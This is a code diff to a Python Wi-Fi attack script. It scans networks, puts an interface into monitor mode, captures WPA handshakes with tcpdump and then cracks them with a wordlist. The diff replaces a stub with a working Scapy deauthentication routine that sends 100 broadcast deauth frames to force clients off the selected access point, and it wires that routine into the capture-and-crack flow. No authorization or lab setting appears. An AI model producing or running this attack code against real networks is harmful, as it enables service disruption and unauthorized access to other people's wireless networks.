@@ -16,6 +16,7 @@ import subprocess
 import sys
 import time
 from pyric import pyw
+from pyric.exceptions import PyRICError
 from scapy.all import *
 
 def display_splash_screen():
@@ -54,19 +55,26 @@ def display_splash_screen():
 
 def check_tool_installed(tool_name):
     try:
-        subprocess.run([tool_name, "--help"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+        result = subprocess.run([tool_name, "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        if result.returncode != 0:
+            raise FileNotFoundError
         print(f"{tool_name} is installed.")
-    except subprocess.CalledProcessError:
+    except (FileNotFoundError, subprocess.CalledProcessError):
         print(f"{tool_name} is not installed. Please install it and run the script again.")
         sys.exit(1)
 
 def set_monitor_mode(interface):
     try:
-        wireless = pyw.Wireless(interface)
-        wireless.interface_up()
-        print(f"Interface {interface} set to monitor mode.")
-    except pyw.PyricError as e:
+        if pyw.modeget(interface) != 'monitor':
+            pyw.down(interface)
+            pyw.modeset(interface, 'monitor')
+            pyw.up(interface)
+            print(f"Interface {interface} set to monitor mode.")
+        else:
+            print(f"Interface {interface} is already in monitor mode.")
+    except PyRICError as e:
         print(f"Error setting interface to monitor mode: {e}")
+        sys.exit(1)
 
 def scan_networks(interface):
     networks = {}
@@ -89,19 +97,20 @@ def scan_networks(interface):
 def capture_handshake(interface, bssid):
     print(f"Capturing handshake for BSSID: {bssid}")
     try:
-        subprocess.run(["tcpdump", "-i", interface, "-w", "handshake-01.cap", "ether host", bssid], check=True)
+        proc = subprocess.Popen(["tcpdump", "-i", interface, "-w", "handshake-01.cap", "ether host", bssid], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        return proc
     except subprocess.CalledProcessError as e:
         print(f"Error capturing handshake: {e}")
+        return None
 
-def inject_packets(interface, bssid):
-    print(f"Injecting packets to BSSID: {bssid}")
-    # You can implement packet injection using Scapy or other methods specific to your needs.
-    # Example: sendp(RadioTap()/Dot11(type=0, subtype=5, addr1=bssid)/...)
+def deauthenticate_clients(interface, bssid):
+    print(f"Deauthenticating clients connected to BSSID: {bssid}")
+    deauth_pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
     try:
-        # Example: sendp(RadioTap()/Dot11(type=0, subtype=5, addr1=bssid)/...)
-        pass
+        sendp(deauth_pkt, iface=interface, count=100, inter=0.1)
+        print("Deauthentication packets sent.")
     except Exception as e:
-        print(f"Error injecting packets: {e}")
+        print(f"Error deauthenticating clients: {e}")
 
 def crack_handshake(wordlist):
     print(f"Cracking handshake using wordlist: {wordlist}")
@@ -128,11 +137,15 @@ def main():
             selection = int(selection) - 1
             bssid = list(networks.keys())[selection]
             print(f"Selected BSSID: {bssid}")
-    
-            capture_handshake(interface, bssid)
-            inject_packets(interface, bssid)  # Optional
-            wordlist = input("Enter the path to your wordlist: ")
-            crack_handshake(wordlist)
+
+            handshake_process = capture_handshake(interface, bssid)
+            if handshake_process:
+                deauthenticate_clients(interface, bssid)
+                time.sleep(30)  # Wait for handshake to be captured
+                handshake_process.terminate()  # Stop tcpdump process
+
+                wordlist = input("Enter the path to your wordlist: ")
+                crack_handshake(wordlist)
     
         except (ValueError, IndexError) as e:
             print(f"Invalid selection: {e}")
